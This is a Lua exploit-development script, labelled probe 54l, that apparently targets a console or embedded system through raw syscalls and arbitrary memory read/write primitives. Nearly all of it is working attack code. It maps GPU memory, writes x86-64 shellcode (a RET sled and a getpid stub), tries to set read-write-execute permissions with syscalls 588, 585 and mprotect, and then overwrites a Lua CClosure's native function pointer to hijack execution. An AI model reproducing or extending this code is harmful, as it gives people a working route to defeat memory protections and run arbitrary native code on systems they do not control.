-- CRASH_CLASS: HIGH
-- PROBE 54l: Verify if sys 588 actually makes GPU pages executable
--
-- Context: Probe 54d showed sys 588 returning ret=0 when setting prot=7 (RWX)
-- on GPU mmap pages. But ret=0 might not mean the permission actually changed.
-- This probe verifies by:
-- 1) Allocating GPU mmap region
-- 2) Writing known shellcode (ret-sled: 0xC3 = ret instruction)
-- 3) Calling sys 588 to set RWX
-- 4) Attempting to read the page (if XO, read would fail)
-- 5) Trying mprotect to see current actual permissions
-- 6) If CClosure +0x30 redirect works, attempting execution
--
-- Also tests: does 585 (mtype_protect) change permissions differently than 588?

print("=== PROBE 54l: RWX VERIFICATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc_mmap = make_syscall(477)
local sc_mprotect = make_syscall(74)
local sc585 = make_syscall(585)
local sc588 = make_syscall(588)
local sc572 = make_syscall(572)

-- Step 1: Allocate GPU mmap region
print("[*] Step 1: Allocate GPU mmap region")
local gpu_size = 4 * 0x4000  -- 4 pages (64KB)
local gpu = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gpu_h, gpu_l = get_hi_lo(gpu)
print("  GPU mmap at: " .. hexval(gpu))

if gpu_h == 0xFFFFFFFF or (gpu_h == 0 and gpu_l == 0) then
    print("  FAILED to allocate GPU region")
    print("=== PROBE 54l ABORTED ===")
    return
end

-- Step 2: Write test patterns to verify R/W works
print("")
print("[*] Step 2: Verify R/W on GPU pages")
local test_ok = safe_wd(gpu, 0x41414141)
local readback = safe_rd(gpu)
print(string.format("  Write 0x41414141, readback = 0x%08X  %s",
    readback or 0, test_ok and readback == 0x41414141 and "OK" or "FAIL"))

-- Write x86-64 shellcode: simple ret (0xC3) sled + NOP sled
-- This is safe: even if executed, it just returns
print("")
print("[*] Step 3: Write ret-sled shellcode to GPU page")
-- Fill first page with NOPs (0x90) then RET (0xC3)
for i = 0, 0x3FF0, 4 do
    safe_wd(gpu + i, 0x90909090)  -- NOP NOP NOP NOP
end
-- Put RET at several offsets
safe_wd(gpu, 0x909090C3)       -- RET at +0
safe_wd(gpu + 0x100, 0x909090C3)  -- RET at +0x100
safe_wd(gpu + 0x1000, 0x909090C3) -- RET at +0x1000

local verify = safe_rd(gpu)
print(string.format("  gpu[0] = 0x%08X (expect 0x909090C3)", verify or 0))

-- Step 4: Call sys 588 to set RWX (prot=7)
print("")
print("[*] Step 4: sys 588 set RWX on GPU region")
local structbuf = memory.alloc(0x100)
for i = 0, 0x3F, 4 do safe_wd(structbuf + i, 0) end
safe_wd(structbuf, 7)  -- prot = PROT_READ|PROT_WRITE|PROT_EXEC

local ok588, ret588 = pcall(function()
    return sc588(uint64(gpu), uint64(gpu_size), uint64(structbuf),
        uint64(0), uint64(0), uint64(0))
end)
if ok588 then
    print("  588(gpu, size, &{prot=7}) = " .. signed32(ret588))
else
    print("  588 CRASHED: " .. tostring(ret588))
end

-- Step 5: Verify page is still readable after 588
print("")
print("[*] Step 5: Post-588 read test")
local post_read = safe_rd(gpu)
print(string.format("  gpu[0] = 0x%08X (should still be 0x909090C3)", post_read or 0))

-- Step 6: Try mprotect to check/change permissions
print("")
print("[*] Step 6: mprotect permission tests")

-- Try mprotect(gpu, size, PROT_READ|PROT_EXEC) = 5
local ok_rx, ret_rx = pcall(function()
    return sc_mprotect(uint64(gpu), uint64(gpu_size), uint64(5))
end)
if ok_rx then
    print("  mprotect(gpu, RX=5) = " .. signed32(ret_rx))
else
    print("  mprotect(gpu, RX=5) CRASHED")
end

-- Try mprotect(gpu, size, PROT_READ|PROT_WRITE|PROT_EXEC) = 7
local ok_rwx, ret_rwx = pcall(function()
    return sc_mprotect(uint64(gpu), uint64(gpu_size), uint64(7))
end)
if ok_rwx then
    print("  mprotect(gpu, RWX=7) = " .. signed32(ret_rwx))
else
    print("  mprotect(gpu, RWX=7) CRASHED")
end

-- Try mprotect(gpu, size, PROT_EXEC) = 4
local ok_x, ret_x = pcall(function()
    return sc_mprotect(uint64(gpu), uint64(gpu_size), uint64(4))
end)
if ok_x then
    print("  mprotect(gpu, X=4) = " .. signed32(ret_x))
    if signed32(ret_x) == 0 then
        print("  >>> mprotect EXEC succeeded! Checking if page is now XO...")
        local post_x_read = safe_rd(gpu)
        if post_x_read == nil then
            print("  >>> Page is now XO (read failed) — EXEC permission IS set!")
        else
            print(string.format("  >>> Page still readable (0x%08X) — might be RX now", post_x_read))
        end
        -- Restore RW so we don't lose access
        pcall(function() sc_mprotect(uint64(gpu), uint64(gpu_size), uint64(3)) end)
    end
else
    print("  mprotect(gpu, X=4) CRASHED")
end

-- Step 7: Use sys 572 to query VM info about the GPU region
print("")
print("[*] Step 7: sys 572 VM info on GPU region")
local vmbuf = memory.alloc(0x200)
for i = 0, 0x1FF, 4 do safe_wd(vmbuf + i, 0) end

-- Try: 572(gpu_addr, outbuf, size)
local ok572, ret572 = pcall(function()
    return sc572(uint64(gpu), uint64(vmbuf), uint64(0x200),
        uint64(0), uint64(0), uint64(0))
end)
if ok572 then
    local rv = signed32(ret572)
    print("  572(gpu, outbuf, 0x200) = " .. rv)
    if rv == 0 then
        -- Dump first 72 bytes
        for i = 0, 68, 4 do
            local v = safe_rd(vmbuf + i)
            if v and v ~= 0 then
                print(string.format("    +%02X: 0x%08X", i, v))
            end
        end
    end
end

-- Also try with outbuf as first arg (the layout that returned ret=0 in 54f)
for i = 0, 0x1FF, 4 do safe_wd(vmbuf + i, 0) end
local ok572b, ret572b = pcall(function()
    return sc572(uint64(vmbuf), uint64(0x200), uint64(0),
        uint64(0), uint64(0), uint64(0))
end)
if ok572b then
    local rv = signed32(ret572b)
    print("  572(outbuf, 0x200, 0) = " .. rv)
    if rv == 0 then
        for i = 0, 68, 4 do
            local v = safe_rd(vmbuf + i)
            if v and v ~= 0 then
                print(string.format("    +%02X: 0x%08X", i, v))
            end
        end
    end
end

-- Step 8: Try sys 585 (mtype_protect) with EXEC
print("")
print("[*] Step 8: sys 585 mtype_protect with EXEC flags")
-- 585 returned 1 in 54d for 585(0, 0x4000, 3)
-- Try on GPU region with various prot values
for _, prot in ipairs({3, 5, 7, 0x33, 0x37}) do
    local ok585, ret585 = pcall(function()
        return sc585(uint64(gpu), uint64(gpu_size), uint64(prot),
            uint64(0), uint64(0), uint64(0))
    end)
    if ok585 then
        print(string.format("  585(gpu, size, 0x%X) = %d", prot, signed32(ret585)))
    else
        print(string.format("  585(gpu, size, 0x%X) CRASHED", prot))
    end
end

-- Step 9: CClosure function pointer analysis
print("")
print("[*] Step 9: CClosure C function pointer")

-- Get CClosure address from a known function
local test_fn = function() return 42 end
local fn_str = tostring(test_fn)
print("  test function: " .. fn_str)

-- Try to get the CClosure struct address from the function
local fn_addr_str = fn_str:match("0x([0-9a-fA-F]+)")
if fn_addr_str then
    local fn_addr = uint64("0x" .. fn_addr_str)
    print("  CClosure at: " .. hexval(fn_addr))

    -- Read +0x30 (C function pointer from 53d results)
    local cfunc = safe_rq(fn_addr + 0x30)
    print("  +0x30 (C func ptr): " .. hexval(cfunc))

    -- Read all offsets for context
    for off = 0, 0x38, 8 do
        local val = safe_rq(fn_addr + off)
        print(string.format("    +0x%02X: %s", off, hexval(val)))
    end

    -- Can we find a simple gadget in eboot?
    -- Look for RET (0xC3) in known eboot range
    local pipe_str = tostring(syscall.pipe)
    print("  pipe: " .. pipe_str)
else
    print("  Could not parse CClosure address")
end

-- Step 10: If GPU page is writable and 588 accepted RWX,
-- try writing a getpid shellcode and redirecting CClosure
print("")
print("[*] Step 10: Shellcode + CClosure redirect test")
print("  WARNING: This may crash the process")

-- Write x86-64 getpid shellcode to GPU page offset 0x2000
-- mov eax, 20  (syscall number for getpid)
-- syscall
-- ret
local sc_offset = 0x2000
safe_wd(gpu + sc_offset,     0x000014B8)  -- mov eax, 20
safe_wd(gpu + sc_offset + 4, 0x90050F00)  -- syscall; nop
safe_wd(gpu + sc_offset + 8, 0x909090C3)  -- ret; nop; nop; nop

local sc_readback = safe_rd(gpu + sc_offset)
print(string.format("  shellcode[0] = 0x%08X (expect 0x000014B8)", sc_readback or 0))

-- Call sys 588 again to ensure RWX on this specific page
for i = 0, 0x3F, 4 do safe_wd(structbuf + i, 0) end
safe_wd(structbuf, 7)
pcall(function()
    sc588(uint64(gpu + sc_offset), uint64(0x4000), uint64(structbuf),
        uint64(0), uint64(0), uint64(0))
end)

-- Now try redirecting CClosure +0x30 to our shellcode
if fn_addr_str then
    local fn_addr = uint64("0x" .. fn_addr_str)
    local old_cfunc = safe_rq(fn_addr + 0x30)
    print("  Old C func: " .. hexval(old_cfunc))

    -- Calculate shellcode address
    local sc_addr_h, sc_addr_l = get_hi_lo(gpu)
    sc_addr_l = sc_addr_l + sc_offset
    -- Handle carry
    if sc_addr_l >= 0x100000000 then
        sc_addr_h = sc_addr_h + 1
        sc_addr_l = sc_addr_l - 0x100000000
    end
    local sc_addr = uint64(string.format("0x%X%08X", sc_addr_h, sc_addr_l))
    print("  Shellcode addr: " .. hexval(sc_addr))

    -- Stop GC
    collectgarbage("stop")

    -- Write shellcode address to CClosure +0x30
    local write_ok = safe_wq(fn_addr + 0x30, sc_addr)
    print("  Write to +0x30: " .. tostring(write_ok))

    if write_ok then
        -- Try calling the function
        local exec_ok, exec_ret = pcall(function() return test_fn() end)
        if exec_ok then
            print("  >>> EXECUTION RETURNED: " .. tostring(exec_ret))
            if type(exec_ret) == "number" and exec_ret > 0 and exec_ret < 1000 then
                print("  >>> POSSIBLE PID! NATIVE CODE EXECUTION ACHIEVED!")
            end
        else
            print("  >>> EXECUTION CRASHED: " .. tostring(exec_ret))
        end

        -- Restore original function pointer
        safe_wq(fn_addr + 0x30, old_cfunc)
        print("  Restored original C func ptr")
    end

    collectgarbage("restart")
end

print("")
print("=== PROBE 54l COMPLETE ===")
